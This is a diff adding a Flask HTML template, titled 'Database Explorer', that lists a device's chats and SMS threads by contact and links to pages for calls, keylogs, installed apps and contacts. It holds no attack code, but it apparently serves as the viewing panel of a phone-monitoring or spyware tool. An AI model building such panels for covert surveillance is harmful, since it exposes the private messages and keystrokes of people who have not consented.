@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Database Explorer</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+  <link rel="stylesheet" href="{{ url_for('static', filename='cyf8QhNEWE-MbVu6J6TSgCzupAm9R8u1G.css') }}">
+  <script src="{{ url_for('static', filename='js/app.js') }}" defer></script>
+  <script src="https://unpkg.com/feather-icons"></script>
+</head>
+<body>
+  <div class="container">
+    <h1>Chats</h1>
+
+    <input type="text" id="search-input" placeholder="Search Messenger" onkeyup="searchMessages()">
+    <div id="search-results"></div>
+
+    <ul id="conversation-list">
+      {% for contact in contacts %}
+        <li>
+            <a href="{{ url_for('chat', contact_name=contact['name']) }}">
+                {{ contact['name'] }}
+                <span class="message-snippet"></span> </a> <br>
+                <a href="{{ url_for('sms_thread', contact_name=contact['name']) }}">
+                {{ contact['name'] }}
+                <span class="message-snippet"></span> </a>
+            <span class="timestamp">{{ contact['time'] }}</span> </li>
+      {% endfor %}
+    </ul>
+
+     <a href="/calls" class="menu-button">Calls</a>
+     <a href="/keylogs" class="menu-button">Keylogs</a>
+     <a href="/installed_apps" class="menu-button">Installed Apps</a>
+     <a href="/contacts" class="menu-button">Contacts</a>
+  </div>
+</body>
+</html>
